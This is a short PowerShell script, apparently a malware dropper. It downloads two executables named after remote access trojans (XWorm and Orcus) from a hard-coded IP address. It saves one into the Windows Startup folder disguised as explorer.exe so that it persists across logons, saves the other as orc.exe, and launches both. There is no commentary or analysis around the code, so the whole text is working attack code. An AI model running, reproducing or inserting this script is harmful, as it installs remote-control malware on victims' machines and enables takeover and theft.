$down = New-Object System.Net.WebClient
$url  = 'http://44.203.122.41:80/Archevod_XWorm.exe'
$file = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\explorer.exe"
$down.DownloadFile($url, $file)

$exec = New-Object -ComObject shell.application
$exec.ShellExecute($file);
$down = New-Object System.Net.WebClient
$url  = 'http://44.203.122.41:80/explorer_orcus.exe'
$file = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\orc.exe"
$down.DownloadFile($url, $file)

$exec = New-Object -ComObject shell.application
$exec.ShellExecute($file);